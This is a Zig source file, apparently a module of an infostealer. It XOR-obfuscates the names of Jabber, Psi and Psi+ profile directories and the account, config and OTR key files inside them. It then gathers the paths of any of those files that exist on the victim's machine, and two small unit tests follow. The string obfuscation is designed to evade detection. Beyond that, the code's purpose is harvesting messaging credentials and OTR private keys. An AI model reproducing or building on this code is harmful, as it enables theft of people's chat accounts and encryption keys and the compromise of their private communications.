const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const JABBER = hash.xorEncrypt("Jabber");
    const ACCOUNTS_XML = hash.xorEncrypt("accounts.xml");
    const CONFIG_XML = hash.xorEncrypt("config.xml");
    const OTR_FINGERPRINTS = hash.xorEncrypt("otr.fingerprints");
    const OTR_KEYS = hash.xorEncrypt("otr.keys");
    const OTR_PRIVATE_KEY = hash.xorEncrypt("otr.private_key");
    const PSI = hash.xorEncrypt("Psi");
    const PSI_PLUS = hash.xorEncrypt("Psi+");
    const PROFILES = hash.xorEncrypt("profiles");
    const DEFAULT = hash.xorEncrypt("default");
};

fn collectSpecificFiles(allocator: std.mem.Allocator, dir_path: []const u8, files: *std.ArrayList([]const u8), names: []const []const u8) void {
    for (names) |name| {
        const path = std.fs.path.join(allocator, &[_][]const u8{ dir_path, name }) catch continue;
        const file = std.fs.openFileAbsolute(path, .{}) catch {
            allocator.free(path);
            continue;
        };
        file.close();
        files.append(path) catch {
            allocator.free(path);
            return;
        };
    }
}

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var jabber_buf: [E.JABBER.len]u8 = undefined;
    var accounts_xml_buf: [E.ACCOUNTS_XML.len]u8 = undefined;
    var config_xml_buf: [E.CONFIG_XML.len]u8 = undefined;
    var otr_fp_buf: [E.OTR_FINGERPRINTS.len]u8 = undefined;
    var otr_keys_buf: [E.OTR_KEYS.len]u8 = undefined;
    var otr_priv_buf: [E.OTR_PRIVATE_KEY.len]u8 = undefined;
    var psi_buf: [E.PSI.len]u8 = undefined;
    var psi_plus_buf: [E.PSI_PLUS.len]u8 = undefined;
    var profiles_buf: [E.PROFILES.len]u8 = undefined;
    var default_buf: [E.DEFAULT.len]u8 = undefined;
    hash.xorDecrypt(&E.JABBER, &jabber_buf);
    hash.xorDecrypt(&E.ACCOUNTS_XML, &accounts_xml_buf);
    hash.xorDecrypt(&E.CONFIG_XML, &config_xml_buf);
    hash.xorDecrypt(&E.OTR_FINGERPRINTS, &otr_fp_buf);
    hash.xorDecrypt(&E.OTR_KEYS, &otr_keys_buf);
    hash.xorDecrypt(&E.OTR_PRIVATE_KEY, &otr_priv_buf);
    hash.xorDecrypt(&E.PSI, &psi_buf);
    hash.xorDecrypt(&E.PSI_PLUS, &psi_plus_buf);
    hash.xorDecrypt(&E.PROFILES, &profiles_buf);
    hash.xorDecrypt(&E.DEFAULT, &default_buf);

    const jabber_names = [_][]const u8{ accounts_xml_buf[0..], config_xml_buf[0..], otr_fp_buf[0..], otr_keys_buf[0..], otr_priv_buf[0..] };

    const base_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, jabber_buf[0..] }) catch {};
    if (base_path) |bp| {
        defer allocator.free(bp);
        collectSpecificFiles(allocator, bp, &files, jabber_names[0..]);
    }

    const psi_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, psi_buf[0..], profiles_buf[0..], default_buf[0..] }) catch {};
    if (psi_path) |pp| {
        defer allocator.free(pp);
        collectSpecificFiles(allocator, pp, &files, jabber_names[0..]);
    }

    const psi_plus_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, psi_plus_buf[0..], profiles_buf[0..], default_buf[0..] }) catch {};
    if (psi_plus_path) |ppp| {
        defer allocator.free(ppp);
        collectSpecificFiles(allocator, ppp, &files, jabber_names[0..]);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__jabber");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collectSpecificFiles skips missing dir" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    collectSpecificFiles(std.testing.allocator, "C:\\__nonexistent__", &list, &[_][]const u8{"accounts.xml"});
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
